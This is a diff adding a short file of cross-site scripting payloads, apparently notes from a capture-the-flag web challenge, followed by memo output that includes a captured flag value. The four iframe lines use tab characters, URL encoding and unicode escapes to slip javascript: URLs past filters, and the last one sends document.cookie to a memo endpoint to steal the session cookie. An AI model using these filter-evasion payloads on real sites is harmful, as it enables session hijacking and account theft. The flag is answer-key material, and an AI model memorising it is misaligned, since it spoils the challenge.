@@ -1,0 +1,11 @@
+<iframe src="javascri%09pt:alert`1`"/>
+<iframe src="javascri%09pt:locati\u006F\u006E='/memo?memo=Test'"/>
+<iframe src="javascri	pt:locati\u006F\u006E='/memo?memo=Test';"/>
+<iframe src="javascri	pt:locati\u006F\u006E='/memo?memo='+\u0064ocument.cookie;"/>
+
+hello
+Test
+Test
+flag=DH{e8140ed5b0770088dd2012e1c9dfd4b4}
+hello
+hello
